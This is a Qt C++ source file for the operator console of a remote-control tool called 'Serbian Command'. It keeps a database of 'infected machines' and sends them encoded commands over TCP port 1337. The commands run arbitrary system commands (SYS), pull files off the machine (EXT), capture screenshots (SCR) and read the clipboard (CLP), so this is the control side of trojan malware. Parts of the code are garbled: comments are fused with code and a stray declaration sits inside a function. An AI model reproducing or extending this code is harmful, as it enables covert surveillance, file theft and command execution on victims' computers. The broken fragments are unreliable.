#include "mainwindow.h"
#include "ui_mainwindow.h"

/**
 * @brief MainWindow::MainWindow Constructor of the main window of the server
 * @param parent The parent widget of the new window
 */
MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    this->statusLabel = new QLabel("Waiting for a database to be loaded...");
    this->statusBar()->addWidget(statusLabel);
    this->loadedFile = nullptr;

    //Network setupin.setDevice(socket);
    in.setVersion(QDataStream::Qt_5_10);
    this->clientSocket = new QTcpSocket(this);
    this->in.setDevice(clientSocket);
    this->in.setVersion(QDataStream::Qt_5_10);

    //Setting our error handler
    connect(clientSocket, QOverload<QTcpSocket::SocketError>::of(&QTcpSocket::error), this, &MainWindow::displayError);
    connect(clientSocket, &QAbstractSocket::disconnected, clientSocket, &QObject::deleteLater);

}

/**
 * @brief MainWindow::~MainWindow Destructor for the main window
 */
MainWindow::~MainWindow()
{
    clientSocket->flush();
    clientSocket->close();
    delete ui;
}

/**
 * @brief MainWindow::on_actionHelp_triggered Creates a new window that displays the help on click of the help button. See {@link HelpWindow}
 */
void MainWindow::on_actionHelp_triggered()
{
    HelpWindow* h = new HelpWindow(this);
    h->show();
    h->setFocus();
}

/**
 * @brief MainWindow::on_actionQuit_triggered Calls the close method of this window on click
 */
void MainWindow::on_actionQuit_triggered()
{
    close();
}

/**
 * @brief MainWindow::on_clipboardButton_clicked Displays a new window that displays the content of the remote clipboard
 */
void MainWindow::on_clipboardButton_clicked()
{
    this->statusLabel->setText("Sending CLP");
    QString cmd = QString("CLP").toUtf8().toBase64();
    resetStatusTimer(3);
    std::cout << cmd.toStdString() << std::endl;

    //Waiting for transmission to be over
    ClipboardWindow* c = new ClipboardWindow(this);
    c->show();
    c->setFocus();
}

/**
 * @brief MainWindow::on_connectButton_clicked Connects to the selected machine
 */
void MainWindow::on_connectButton_clicked()
{
    this->statusLabel->setText("Connecting to machine " + selectedMachineName + " on port 1337...");

    QString cmd = QString("CNT").toUtf8().toBase64();
    resetStatusTimer(3);

    this->clientSocket->connectToHost("127.0.0.1", 1337);
}

/**
 * @brief MainWindow::on_sendCmdButton_clicked Sends a command to the selected machine
 */
void MainWindow::on_sendCmdButton_clicked()
{
    this->statusLabel->setText("Sending SYS:" + this->ui->cmdLine->text());
    QString cmd = ("SYS:" + this->ui->cmdLine->text()).toUtf8().toBase64();

    resetStatusTimer(3);
    sendCmd(cmd);
}

/**
 * @brief MainWindow::on_extractButton_clicked Extract a file from remote a displays a 'Save As ...' window
 */
void MainWindow::on_extractButton_clicked()
{
   this->statusLabel->setText("Sending EXT:" + this->ui->fileLine->text());
   QString cmd = ("EXT:" + this->ui->fileLine->text()).toUtf8().toBase64();
   resetStatusTimer(3);
   sendCmd(cmd);
}

/**
 * @brief MainWindow::on_screenshotButton_clicked Takes a screenshot on the remote machine and displays it on the server
 */
void MainWindow::on_screenshotButton_clicked()
{
  this->statusLabel->setText("Sending SCR");
  QString cmd = QString("SCR").toUtf8().toBase64();
  resetStatusTimer(3);
  sendCmd(cmd);
}

/**
 * @brief MainWindow::on_actionLoad_triggered Displays an "Open" window and loads a database
 */
void MainWindow::on_actionLoad_triggered()
{
  QString fileName = QFileDialog::getOpenFileName(this,tr("Open Database"), "",tr("Virus database (*.vdb)"));
  QFile *saveFile = new QFile(fileName);
  if (!saveFile->open(QIODevice::ReadOnly)) {
      qWarning("Couldn't open save file.");
      return;
  }
  this->loadedFile = saveFile;

  this->statusLabel->setText("Loading database...");

  QByteArray fileStr = saveFile->readAll();
  loadedFile->close();

  QJsonDocument loadedJSON(QJsonDocument::fromJson(fileStr));
  loadedJSON.object();

  resetStatusTimer(3);
}

/**
 * @brief MainWindow::on_actionSave_triggered If no file as been selected, calls actionSave_as, otherwise writes data to file
 */
void MainWindow::on_actionSave_triggered()
{
  if(this->loadedFile == nullptr){
    on_actionSave_as_triggered();
    return;
  }
  if (!this->loadedFile->open(QIODevice::WriteOnly)) {
      qWarning("Couldn't open save file.");
      return;
  }
  this->loadedFile->close();
  writeJSONToFile(this->loadedFile);
}

/**
 * @brief MainWindow::on_actionSave_as_triggered Displays a "Save as ..." window, and writes data to file
 */
void MainWindow::on_actionSave_as_triggered()
{
  QString fileName = QFileDialog::getSaveFileName(this,tr("Open Database"), "",tr("Virus database (*.vdb)"));
  QFile *saveFile = new QFile(fileName);
  if (!saveFile->open(QIODevice::WriteOnly)) {
      qWarning("Couldn't open save file.");
      return;
  }
  saveFile->close();
  this->loadedFile = saveFile;
  writeJSONToFile(this->loadedFile);
}

/**
 * @brief on_tableWidget_cellClicked Changes the selected machine attribute according to user input
 * @param row The row of the cell that has been c );
licked on
 * @param column Unused
 */
void MainWindow::on_tableWidget_cellClicked(int row, int column){
  this->selectedMachineIp = this->ui->tableWidget->item(row, 1)->text();
  this->selectedMachineName = this->ui->tableWidget->item(row, 0)->text();
}

/**
 * @brief MainWindow::prepareJSON Goes through the QTableWidget, and prepares a QJsonDocument
 * @return A JSON describing the database status
 */
QJsonDocument* MainWindow::prepareJSON()
{
  QJsonObject mainJson = QJsonObject();
  QJsonArray machineArray = QJsonArray();

  for(int i = 0; i < this->ui->tableWidget->rowCount(); i++){
    QString name = this->ui->tableWidget->item(i,0)->text();
    QString ip = this->ui->tableWidget->item(i,1)->text();

    QJsonObject machine = QJsonObject();

    machine["Machine Name"] = name;
    machine["Machine IP"] = ip;


    machineArray.append(machine);
  }

  mainJson["Machines"] = machineArray;
  QJsonDocument *JsonDoc = new QJsonDocument(mainJson);
  void displayError(QTcpSocket::SocketError);

  std::cout << (JsonDoc)->toJson().toStdString() << std::endl;
  return JsonDoc;
}

/**
 * @brief MainWindow::writeJSONToFile Prepares and write the JSON to a file
 * @param file The file to write to
 */
void MainWindow::writeJSONToFile(QFile* file){
  if(!file->open(QIODevice::WriteOnly  | QFile::Truncate)) {
    qWarning("Couldn't open save file.");
    return;
  }
  QJsonDocument* doc = prepareJSON();
  file->write(doc->toJson());
  file->close();
}

/**
 * @brief MainWindow::displayError Custom socket errors handler
 * @param socketError The socket error that will be handled
 */
void MainWindow::displayError(QTcpSocket::SocketError socketError)
{
    switch (socketError) {
    case QAbstractSocket::HostNotFoundError:
        this->statusLabel->setText(this->selectedMachineName + ": Host not found");
        QMessageBox::information(this, "Serbian Command", "Host not found");
        break;
    case QAbstractSocket::ConnectionRefusedError:
        this->statusLabel->setText(this->selectedMachineName + ": Connection refused");
        QMessageBox::information(this, "Serbian Command", "Connection refused by remote client");
        break;
    default:
        this->statusLabel->setText(this->selectedMachineName + ": Error");
        QMessageBox::information(this, "Serbian Command", "The following error occurred:"); // + (this->socket->errorString()));
    }

    resetStatusTimer(5);
}

void MainWindow::read(){
  if (blockSize == 0) {
      // Relies on the fact that QDataStream serializes a quint32 into
      // sizeof(quint32) bytes
      if (clientSocket->bytesAvailable() < (int)sizeof(quint32))
          return;
      in >> blockSize;
  }

  if (clientSocket->bytesAvailable() < blockSize || in.atEnd())
      return;

  QString returnStr;
  in >> returnStr;
}

void MainWindow::sendCmd(QString cmd){
  this->clientSocket->write(cmd.toUtf8());
  this->clientSocket->flush();
}

/**
 * @brief MainWindow::resetStatusTimer Calls resetStatus after a timer ends
 * @param timeSec Defaults to 0. Time in seconds before the reset
 */
void MainWindow::resetStatusTimer(int timeSec = 0){
  QTimer::singleShot(timeSec * 1000, this, &MainWindow::resetStatus);
}

/**
 * @brief MainWindow::resetStatus Resets the status with a premade string of the type "Message + Number of machines in store"
 */
void MainWindow::resetStatus(){
  QString status = "Standing by. There are " + QString::number(this->ui->tableWidget->rowCount()) + " infected machines";
  this->statusLabel->setText(status);
}
